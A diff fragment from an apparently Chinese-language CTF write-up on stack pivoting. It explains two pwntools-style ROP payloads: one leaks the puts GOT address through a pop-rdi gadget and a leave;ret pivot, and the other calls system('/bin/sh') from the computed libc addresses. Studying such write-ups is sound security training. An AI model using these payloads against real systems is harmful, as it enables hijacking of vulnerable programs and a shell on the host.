@@ -23,15 +23,21 @@ ROPgadget一下，需要leave_ret。顺便把rdi和ret也爆一下，后面需�
 泄露的地址加上8，就是需要迁移到的地址。
 
 构造第一个payload，泄露got表中puts函数的地址（其他函数也可以）。开头填充8个a是为了覆盖新的rbp的值。
+
 payload = b'a'*8 + p64(rdi_addr) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main)
+
 payload = payload.ljust(80,b'a')
+
 payload += p64(stack) +p64(leave)
 
 然后接收puts函数的地址并计算libc基地址、system函数地址和binsh字符串地址。
 
 构造第二个payload，加ret是为了进行栈对齐。
+
 payload = b'a'*8 + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)
+
 payload = payload.ljust(80,b'a')
+
 payload += p64(stack) +p64(leave)
 
 
